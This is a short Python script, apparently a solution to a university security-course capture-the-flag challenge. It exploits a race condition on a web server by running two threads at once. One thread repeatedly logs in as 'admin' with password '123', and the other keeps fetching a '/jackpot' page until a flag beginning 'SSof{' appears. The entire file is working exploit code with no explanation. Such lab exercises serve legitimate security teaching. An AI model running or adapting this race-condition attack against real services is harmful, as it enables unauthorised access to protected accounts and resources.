import requests
import threading
import time

SERVER='http://mustard.stt.rnl.tecnico.ulisboa.pt:25652'


s = requests.Session()

# Tentar forçar o login como admin
def force_login(stop_event):
    while not stop_event.is_set():
        r = s.post(SERVER + "/login", data={
            'username': 'admin',
            'password': '123'
            })

        print(f'status     : {r.status_code}')
        time.sleep(0.1)

# Tentar obter o jackpot
def get_jackpot(stop_event):
    while not stop_event.is_set():
        r = s.get(SERVER + "/jackpot")
        print(f'status     : {r.status_code}')
        print(f"Html       : {r.text}")
        if "SSof{" in r.text:
            print("Flag found!\n" + r.text)
            stop_event.set()
            break
        time.sleep(0.1)
        
stop_event = threading.Event()

# Thread a forçar o login
p1 = threading.Thread(target=force_login, args=(stop_event,), daemon=True)
# Thread a tentar obter o jackpot
p2 = threading.Thread(target=get_jackpot, args=(stop_event,), daemon=True)
p1.start()
p2.start()
p2.join()

# Parar a thread de login quando a flag for encontrada
stop_event.set()
p1.join()
